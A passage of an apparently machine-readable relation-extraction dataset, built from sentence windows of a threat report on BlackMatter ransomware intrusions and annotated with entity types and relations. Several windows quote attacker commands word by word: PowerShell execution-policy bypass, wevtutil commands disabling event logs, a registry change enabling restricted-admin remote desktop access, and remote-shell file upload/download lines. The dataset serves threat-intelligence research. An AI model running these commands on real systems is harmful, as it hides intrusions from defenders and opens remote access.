"0_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [31, 31], "name": "TeamViewer installation", "pos": [4, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [35, 35], "name": "BlackMatter attackers", "pos": [8, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [48, 48], "name": "They", "pos": [0, 1], "index": "3_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [51, 51], "name": "keepass password manager configuration", "pos": [3, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [84, 84], "name": "the tool", "pos": [2, 4], "index": "5_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [91, 91], "name": "WinRM service", "pos": [9, 11], "index": "6_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [97, 97], "name": "firewall", "pos": [15, 16], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [111, 111], "name": "Attackers", "pos": [0, 1], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [114, 114], "name": "WinRM", "pos": [3, 4], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [117, 117], "name": "PowerShell", "pos": [6, 7], "index": "10_0"}]], "labels": [{"r": "RD", "evidence": [2], "t": 1, "h": 2}, {"r": "RD", "evidence": [3], "h": 3, "t": 4}, {"r": "CO", "evidence": [5, 6], "h": 5, "t": 9}, {"r": "WR", "evidence": [0, 1, 2, 3, 4, 5, 6], "t": 0, "h": 8}, {"r": "RD", "evidence": [5, 6], "t": 7, "h": 8}, {"r": "ST", "evidence": [5, 6], "t": 6, "h": 8}, {"r": "WR", "evidence": [5, 6], "t": 7, "h": 8}, {"r": "EX", "evidence": [6], "h": 8, "t": 9}, {"r": "FR", "evidence": [6], "h": 8, "t": 10}]}, {"title": "029-26", "sents": [["c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\adrecon.ps1"], ["In", "addition", "to", "compromising", "TeamViewer", "installation", ",", "the", "BlackMatter", "attackers", "sought", "out", "other", "ways", "to", "sustain", "access", "during", "their", "attack", "."], ["They", "explored", "the", "keepass", "password", "manager", "configuration", "using", "the", "following", "commands", ":"], ["It", "is", "possible", "to", "detect", "the", "tool", "'s", "activity", "by", "monitoring", "processes", "created", "by", "wmipsrv.exe", "that", "terminate", "with", "the", "following", "string", ":"], ["Furthermore", ",", "the", "tool", "was", "frequently", "used", "to", "enable", "WinRM", "service", "network", "connections", "through", "the", "firewall", ",", "which", "may", "have", "been", "for", "the", "convenience", "of", "accessing", "prepared", "scripts", "."], ["Attackers", "can", "utilize", "WinRM", "to", "execute", "PowerShell", "commands", "on", "remote", "machines", "."], ["This", "tool", "'s", "presence", "can", "be", "detected", "by", "searching", "for", "processes", "initiated", "by", "``", "wsmprovhost.exe", "''", "."], ["The", "attackers", "used", "the", "following", "commands", "to", "disable", "logging", "for", "active", "directory", "web", "services", ",", "hardware", "events", ",", "and", "internet", "explorer", "respectively", ":"]], "vertexSet": [[{"type": "TF", "sent_id": 1, "global_pos": [10, 10], "name": "TeamViewer installation", "pos": [4, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [14, 14], "name": "BlackMatter attackers", "pos": [8, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [27, 27], "name": "They", "pos": [0, 1], "index": "2_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [30, 30], "name": "keepass password manager configuration", "pos": [3, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [63, 63], "name": "the tool", "pos": [2, 4], "index": "4_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [70, 70], "name": "WinRM service", "pos": [9, 11], "index": "5_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [76, 76], "name": "firewall", "pos": [15, 16], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [90, 90], "name": "Attackers", "pos": [0, 1], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [93, 93], "name": "WinRM", "pos": [3, 4], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [96, 96], "name": "PowerShell", "pos": [6, 7], "index": "9_0"}]], "labels": [{"r": "RD", "evidence": [1], "t": 0, "h": 1}, {"r": "RD", "evidence": [2], "h": 2, "t": 3}, {"r": "CO", "evidence": [4, 5], "h": 4, "t": 8}, {"r": "RD", "evidence": [4, 5], "t": 6, "h": 7}, {"r": "ST", "evidence": [4, 5], "t": 5, "h": 7}, {"r": "WR", "evidence": [4, 5], "t": 6, "h": 7}, {"r": "EX", "evidence": [5], "h": 7, "t": 8}, {"r": "FR", "evidence": [5], "h": 7, "t": 9}]}, {"title": "029-27", "sents": [["In", "addition", "to", "compromising", "TeamViewer", "installation", ",", "the", "BlackMatter", "attackers", "sought", "out", "other", "ways", "to", "sustain", "access", "during", "their", "attack", "."], ["They", "explored", "the", "keepass", "password", "manager", "configuration", "using", "the", "following", "commands", ":"], ["It", "is", "possible", "to", "detect", "the", "tool", "'s", "activity", "by", "monitoring", "processes", "created", "by", "wmipsrv.exe", "that", "terminate", "with", "the", "following", "string", ":"], ["Furthermore", ",", "the", "tool", "was", "frequently", "used", "to", "enable", "WinRM", "service", "network", "connections", "through", "the", "firewall", ",", "which", "may", "have", "been", "for", "the", "convenience", "of", "accessing", "prepared", "scripts", "."], ["Attackers", "can", "utilize", "WinRM", "to", "execute", "PowerShell", "commands", "on", "remote", "machines", "."], ["This", "tool", "'s", "presence", "can", "be", "detected", "by", "searching", "for", "processes", "initiated", "by", "``", "wsmprovhost.exe", "''", "."], ["The", "attackers", "used", "the", "following", "commands", "to", "disable", "logging", "for", "active", "directory", "web", "services", ",", "hardware", "events", ",", "and", "internet", "explorer", "respectively", ":"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "active", "directory", "web", "services", "/enabled", ":", "false"]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [4, 4], "name": "TeamViewer installation", "pos": [4, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "BlackMatter attackers", "pos": [8, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "They", "pos": [0, 1], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [24, 24], "name": "keepass password manager configuration", "pos": [3, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [57, 57], "name": "the tool", "pos": [2, 4], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [64, 64], "name": "WinRM service", "pos": [9, 11], "index": "5_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [70, 70], "name": "firewall", "pos": [15, 16], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [84, 84], "name": "Attackers", "pos": [0, 1], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [87, 87], "name": "WinRM", "pos": [3, 4], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [90, 90], "name": "PowerShell", "pos": [6, 7], "index": "9_0"}]], "labels": [{"r": "RD", "evidence": [0], "t": 0, "h": 1}, {"r": "RD", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [3, 4], "h": 4, "t": 8}, {"r": "RD", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "ST", "evidence": [3, 4], "t": 5, "h": 7}, {"r": "WR", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "EX", "evidence": [4], "h": 7, "t": 8}, {"r": "FR", "evidence": [4], "h": 7, "t": 9}]}, {"title": "029-28", "sents": [["They", "explored", "the", "keepass", "password", "manager", "configuration", "using", "the", "following", "commands", ":"], ["It", "is", "possible", "to", "detect", "the", "tool", "'s", "activity", "by", "monitoring", "processes", "created", "by", "wmipsrv.exe", "that", "terminate", "with", "the", "following", "string", ":"], ["Furthermore", ",", "the", "tool", "was", "frequently", "used", "to", "enable", "WinRM", "service", "network", "connections", "through", "the", "firewall", ",", "which", "may", "have", "been", "for", "the", "convenience", "of", "accessing", "prepared", "scripts", "."], ["Attackers", "can", "utilize", "WinRM", "to", "execute", "PowerShell", "commands", "on", "remote", "machines", "."], ["This", "tool", "'s", "presence", "can", "be", "detected", "by", "searching", "for", "processes", "initiated", "by", "``", "wsmprovhost.exe", "''", "."], ["The", "attackers", "used", "the", "following", "commands", "to", "disable", "logging", "for", "active", "directory", "web", "services", ",", "hardware", "events", ",", "and", "internet", "explorer", "respectively", ":"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "active", "directory", "web", "services", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "hardwareevents", "/enabled", ":", "false"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "They", "pos": [0, 1], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [3, 3], "name": "keepass password manager configuration", "pos": [3, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [36, 36], "name": "the tool", "pos": [2, 4], "index": "2_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [43, 43], "name": "WinRM service", "pos": [9, 11], "index": "3_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [49, 49], "name": "firewall", "pos": [15, 16], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [63, 63], "name": "Attackers", "pos": [0, 1], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [66, 66], "name": "WinRM", "pos": [3, 4], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "PowerShell", "pos": [6, 7], "index": "7_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 6}, {"r": "RD", "evidence": [2, 3], "t": 4, "h": 5}, {"r": "ST", "evidence": [2, 3], "t": 3, "h": 5}, {"r": "WR", "evidence": [2, 3], "t": 4, "h": 5}, {"r": "EX", "evidence": [3], "h": 5, "t": 6}, {"r": "FR", "evidence": [3], "h": 5, "t": 7}]}, {"title": "029-29", "sents": [["It", "is", "possible", "to", "detect", "the", "tool", "'s", "activity", "by", "monitoring", "processes", "created", "by", "wmipsrv.exe", "that", "terminate", "with", "the", "following", "string", ":"], ["Furthermore", ",", "the", "tool", "was", "frequently", "used", "to", "enable", "WinRM", "service", "network", "connections", "through", "the", "firewall", ",", "which", "may", "have", "been", "for", "the", "convenience", "of", "accessing", "prepared", "scripts", "."], ["Attackers", "can", "utilize", "WinRM", "to", "execute", "PowerShell", "commands", "on", "remote", "machines", "."], ["This", "tool", "'s", "presence", "can", "be", "detected", "by", "searching", "for", "processes", "initiated", "by", "``", "wsmprovhost.exe", "''", "."], ["The", "attackers", "used", "the", "following", "commands", "to", "disable", "logging", "for", "active", "directory", "web", "services", ",", "hardware", "events", ",", "and", "internet", "explorer", "respectively", ":"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "active", "directory", "web", "services", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "hardwareevents", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "internet", "explorer", "/enabled", ":", "false"]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "the tool", "pos": [2, 4], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [31, 31], "name": "WinRM service", "pos": [9, 11], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [37, 37], "name": "firewall", "pos": [15, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [51, 51], "name": "Attackers", "pos": [0, 1], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [54, 54], "name": "WinRM", "pos": [3, 4], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [57, 57], "name": "PowerShell", "pos": [6, 7], "index": "5_0"}]], "labels": [{"r": "CO", "evidence": [1, 2], "h": 0, "t": 4}, {"r": "RD", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "ST", "evidence": [1, 2], "t": 1, "h": 3}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "EX", "evidence": [2], "h": 3, "t": 4}, {"r": "FR", "evidence": [2], "h": 3, "t": 5}]}, {"title": "029-30", "sents": [["Furthermore", ",", "the", "tool", "was", "frequently", "used", "to", "enable", "WinRM", "service", "network", "connections", "through", "the", "firewall", ",", "which", "may", "have", "been", "for", "the", "convenience", "of", "accessing", "prepared", "scripts", "."], ["Attackers", "can", "utilize", "WinRM", "to", "execute", "PowerShell", "commands", "on", "remote", "machines", "."], ["This", "tool", "'s", "presence", "can", "be", "detected", "by", "searching", "for", "processes", "initiated", "by", "``", "wsmprovhost.exe", "''", "."], ["The", "attackers", "used", "the", "following", "commands", "to", "disable", "logging", "for", "active", "directory", "web", "services", ",", "hardware", "events", ",", "and", "internet", "explorer", "respectively", ":"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "active", "directory", "web", "services", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "hardwareevents", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "internet", "explorer", "/enabled", ":", "false"], ["The", "attackers", "utilized", "Microsoft", "Remote", "Desktop", "to", "gain", "GUI", "access", "to", "various", "systems", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "the tool", "pos": [2, 4], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "WinRM service", "pos": [9, 11], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [15, 15], "name": "firewall", "pos": [15, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "Attackers", "pos": [0, 1], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "WinRM", "pos": [3, 4], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "PowerShell", "pos": [6, 7], "index": "5_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [110, 110], "name": "attackers", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [112, 112], "name": "Microsoft Remote Desktop", "pos": [3, 6], "index": "7_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [117, 117], "name": "GUI", "pos": [8, 9], "index": "8_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "RD", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "ST", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "WR", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 3, "t": 6}, {"r": "EX", "evidence": [7], "h": 6, "t": 7}, {"r": "CD", "evidence": [7], "h": 6, "t": 8}]}, {"title": "029-31", "sents": [["Attackers", "can", "utilize", "WinRM", "to", "execute", "PowerShell", "commands", "on", "remote", "machines", "."], ["This", "tool", "'s", "presence", "can", "be", "detected", "by", "searching", "for", "processes", "initiated", "by", "``", "wsmprovhost.exe", "''", "."], ["The", "attackers", "used", "the", "following", "commands", "to", "disable", "logging", "for", "active", "directory", "web", "services", ",", "hardware", "events", ",", "and", "internet", "explorer", "respectively", ":"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "active", "directory", "web", "services", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "hardwareevents", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "internet", "explorer", "/enabled", ":", "false"], ["The", "attackers", "utilized", "Microsoft", "Remote", "Desktop", "to", "gain", "GUI", "access", "to", "various", "systems", "."], ["Before", "gaining", "remote", "admin", "access", ",", "the", "following", "impacket", "command", "was", "executed", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Attackers", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "WinRM", "pos": [3, 4], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "PowerShell", "pos": [6, 7], "index": "2_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [81, 81], "name": "attackers", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [83, 83], "name": "Microsoft Remote Desktop", "pos": [3, 6], "index": "4_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [88, 88], "name": "GUI", "pos": [8, 9], "index": "5_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 0, "t": 3}, {"r": "EX", "evidence": [6], "h": 3, "t": 4}, {"r": "CD", "evidence": [6], "h": 3, "t": 5}]}, {"title": "029-32", "sents": [["This", "tool", "'s", "presence", "can", "be", "detected", "by", "searching", "for", "processes", "initiated", "by", "``", "wsmprovhost.exe", "''", "."], ["The", "attackers", "used", "the", "following", "commands", "to", "disable", "logging", "for", "active", "directory", "web", "services", ",", "hardware", "events", ",", "and", "internet", "explorer", "respectively", ":"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "active", "directory", "web", "services", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "hardwareevents", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "internet", "explorer", "/enabled", ":", "false"], ["The", "attackers", "utilized", "Microsoft", "Remote", "Desktop", "to", "gain", "GUI", "access", "to", "various", "systems", "."], ["Before", "gaining", "remote", "admin", "access", ",", "the", "following", "impacket", "command", "was", "executed", ":"], ["cmd.exe", "/q", "/c", "reg", "add", "hkey_local_machine\\system\\currentcontrolset\\control\\lsa", "/v", "disablerestrictedadmin", "/t", "reg_dword", "/d", "0", "1", ">", "\\127.0.0.1\\admin", "$", "__", "<", "timestamp", ">", ".", "<", "num", ">", "2", ">", "&", "1"]], "vertexSet": [[{"type": "MP", "sent_id": 5, "global_pos": [69, 69], "name": "attackers", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [71, 71], "name": "Microsoft Remote Desktop", "pos": [3, 6], "index": "1_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [76, 76], "name": "GUI", "pos": [8, 9], "index": "2_0"}]], "labels": [{"r": "EX", "evidence": [5], "h": 0, "t": 1}, {"r": "CD", "evidence": [5], "h": 0, "t": 2}]}, {"title": "029-33", "sents": [["The", "attackers", "used", "the", "following", "commands", "to", "disable", "logging", "for", "active", "directory", "web", "services", ",", "hardware", "events", ",", "and", "internet", "explorer", "respectively", ":"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "active", "directory", "web", "services", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "hardwareevents", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "internet", "explorer", "/enabled", ":", "false"], ["The", "attackers", "utilized", "Microsoft", "Remote", "Desktop", "to", "gain", "GUI", "access", "to", "various", "systems", "."], ["Before", "gaining", "remote", "admin", "access", ",", "the", "following", "impacket", "command", "was", "executed", ":"], ["cmd.exe", "/q", "/c", "reg", "add", "hkey_local_machine\\system\\currentcontrolset\\control\\lsa", "/v", "disablerestrictedadmin", "/t", "reg_dword", "/d", "0", "1", ">", "\\127.0.0.1\\admin", "$", "__", "<", "timestamp", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["Interestingly", ",", "an", "OPSEC", "mistake", "revealed", "the", "use", "of", "Kali", "Linux", "by", "the", "attackers", "to", "execute", "remote", "commands", "through", "their", "shell", "upload", "and", "download", "commands", ",", "as", "shown", "below", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 4, "global_pos": [52, 52], "name": "attackers", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [54, 54], "name": "Microsoft Remote Desktop", "pos": [3, 6], "index": "1_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [59, 59], "name": "GUI", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [119, 119], "name": "attackers", "pos": [13, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [122, 122], "name": "remote commands", "pos": [16, 18], "index": "4_0"}]], "labels": [{"r": "EX", "evidence": [4], "h": 0, "t": 1}, {"r": "CD", "evidence": [4], "h": 0, "t": 2}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 0, "t": 3}, {"r": "EX", "evidence": [7], "h": 3, "t": 4}]}, {"title": "029-34", "sents": [["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "active", "directory", "web", "services", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "hardwareevents", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "internet", "explorer", "/enabled", ":", "false"], ["The", "attackers", "utilized", "Microsoft", "Remote", "Desktop", "to", "gain", "GUI", "access", "to", "various", "systems", "."], ["Before", "gaining", "remote", "admin", "access", ",", "the", "following", "impacket", "command", "was", "executed", ":"], ["cmd.exe", "/q", "/c", "reg", "add", "hkey_local_machine\\system\\currentcontrolset\\control\\lsa", "/v", "disablerestrictedadmin", "/t", "reg_dword", "/d", "0", "1", ">", "\\127.0.0.1\\admin", "$", "__", "<", "timestamp", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["Interestingly", ",", "an", "OPSEC", "mistake", "revealed", "the", "use", "of", "Kali", "Linux", "by", "the", "attackers", "to", "execute", "remote", "commands", "through", "their", "shell", "upload", "and", "download", "commands", ",", "as", "shown", "below", ":"], ["cmd.exe", "/q", "/c", "#", "upload", "c", ":", "\\users", "<", "user", ">", "\\documents", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\127.0.0.1\\admin\\", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"]], "vertexSet": [[{"type": "MP", "sent_id": 3, "global_pos": [29, 29], "name": "attackers", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [31, 31], "name": "Microsoft Remote Desktop", "pos": [3, 6], "index": "1_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [36, 36], "name": "GUI", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [96, 96], "name": "attackers", "pos": [13, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [99, 99], "name": "remote commands", "pos": [16, 18], "index": "4_0"}]], "labels": [{"r": "EX", "evidence": [3], "h": 0, "t": 1}, {"r": "CD", "evidence": [3], "h": 0, "t": 2}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 0, "t": 3}, {"r": "EX", "evidence": [6], "h": 3, "t": 4}]}, {"title": "029-35", "sents": [["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "hardwareevents", "/enabled", ":", "false"], ["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "internet", "explorer", "/enabled", ":", "false"], ["The", "attackers", "utilized", "Microsoft", "Remote", "Desktop", "to", "gain", "GUI", "access", "to", "various", "systems", "."], ["Before", "gaining", "remote", "admin", "access", ",", "the", "following", "impacket", "command", "was", "executed", ":"], ["cmd.exe", "/q", "/c", "reg", "add", "hkey_local_machine\\system\\currentcontrolset\\control\\lsa", "/v", "disablerestrictedadmin", "/t", "reg_dword", "/d", "0", "1", ">", "\\127.0.0.1\\admin", "$", "__", "<", "timestamp", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["Interestingly", ",", "an", "OPSEC", "mistake", "revealed", "the", "use", "of", "Kali", "Linux", "by", "the", "attackers", "to", "execute", "remote", "commands", "through", "their", "shell", "upload", "and", "download", "commands", ",", "as", "shown", "below", ":"], ["cmd.exe", "/q", "/c", "#", "upload", "c", ":", "\\users", "<", "user", ">", "\\documents", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\127.0.0.1\\admin\\", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["cmd.exe", "/q", "/c", "#", "download", "c", ":", "\\users\\", "<", "user", ">", "\\documents\\", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\\\127.0.0.1\\admin", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"]], "vertexSet": [[{"type": "MP", "sent_id": 2, "global_pos": [18, 18], "name": "attackers", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [20, 20], "name": "Microsoft Remote Desktop", "pos": [3, 6], "index": "1_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [25, 25], "name": "GUI", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [85, 85], "name": "attackers", "pos": [13, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [88, 88], "name": "remote commands", "pos": [16, 18], "index": "4_0"}]], "labels": [{"r": "EX", "evidence": [2], "h": 0, "t": 1}, {"r": "CD", "evidence": [2], "h": 0, "t": 2}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 0, "t": 3}, {"r": "EX", "evidence": [5], "h": 3, "t": 4}]}, {"title": "029-36", "sents": [["c", ":", "\\windows\\system32\\wevtutil.exe", "set-log", "internet", "explorer", "/enabled", ":", "false"], ["The", "attackers", "utilized", "Microsoft", "Remote", "Desktop", "to", "gain", "GUI", "access", "to", "various", "systems", "."], ["Before", "gaining", "remote", "admin", "access", ",", "the", "following", "impacket", "command", "was", "executed", ":"], ["cmd.exe", "/q", "/c", "reg", "add", "hkey_local_machine\\system\\currentcontrolset\\control\\lsa", "/v", "disablerestrictedadmin", "/t", "reg_dword", "/d", "0", "1", ">", "\\127.0.0.1\\admin", "$", "__", "<", "timestamp", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["Interestingly", ",", "an", "OPSEC", "mistake", "revealed", "the", "use", "of", "Kali", "Linux", "by", "the", "attackers", "to", "execute", "remote", "commands", "through", "their", "shell", "upload", "and", "download", "commands", ",", "as", "shown", "below", ":"], ["cmd.exe", "/q", "/c", "#", "upload", "c", ":", "\\users", "<", "user", ">", "\\documents", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\127.0.0.1\\admin\\", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["cmd.exe", "/q", "/c", "#", "download", "c", ":", "\\users\\", "<", "user", ">", "\\documents\\", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\\\127.0.0.1\\admin", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["It", "is", "improbable", "that", "the", "attackers", "had", "installed", "Kali", "Linux", "within", "the", "victim", "'s", "network", ",", "which", "suggests", "that", "remote", "system", "control", "was", "achieved", "via", "the", "SSH", "tunnels", "established", "previously", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [10, 10], "name": "attackers", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [12, 12], "name": "Microsoft Remote Desktop", "pos": [3, 6], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [17, 17], "name": "GUI", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [77, 77], "name": "attackers", "pos": [13, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [80, 80], "name": "remote commands", "pos": [16, 18], "index": "4_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [165, 165], "name": "attackers", "pos": [5, 6], "index": "5_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [186, 186], "name": "SSH tunnels", "pos": [26, 28], "index": "6_0"}]], "labels": [{"r": "EX", "evidence": [1], "h": 0, "t": 1}, {"r": "CD", "evidence": [1], "h": 0, "t": 2}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 0, "t": 3}, {"r": "EX", "evidence": [4], "h": 3, "t": 4}, {"r": "EX", "evidence": [7], "h": 5, "t": 6}]}, {"title": "029-37", "sents": [["The", "attackers", "utilized", "Microsoft", "Remote", "Desktop", "to", "gain", "GUI", "access", "to", "various", "systems", "."], ["Before", "gaining", "remote", "admin", "access", ",", "the", "following", "impacket", "command", "was", "executed", ":"], ["cmd.exe", "/q", "/c", "reg", "add", "hkey_local_machine\\system\\currentcontrolset\\control\\lsa", "/v", "disablerestrictedadmin", "/t", "reg_dword", "/d", "0", "1", ">", "\\127.0.0.1\\admin", "$", "__", "<", "timestamp", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["Interestingly", ",", "an", "OPSEC", "mistake", "revealed", "the", "use", "of", "Kali", "Linux", "by", "the", "attackers", "to", "execute", "remote", "commands", "through", "their", "shell", "upload", "and", "download", "commands", ",", "as", "shown", "below", ":"], ["cmd.exe", "/q", "/c", "#", "upload", "c", ":", "\\users", "<", "user", ">", "\\documents", "<", "doc", ">", "/home/kali/desktop/", "<", "doc", ">", "1", ">", "\\127.0.0.1\\admin\\", "<", "num", ">", ".", "<", "num", ">", "2", ">", "&", "1"], ["cmd.exe", "/q", "/c", "#", "download", "c", ":", "\\users\\", "<", "user", ">", "\\documents\\", 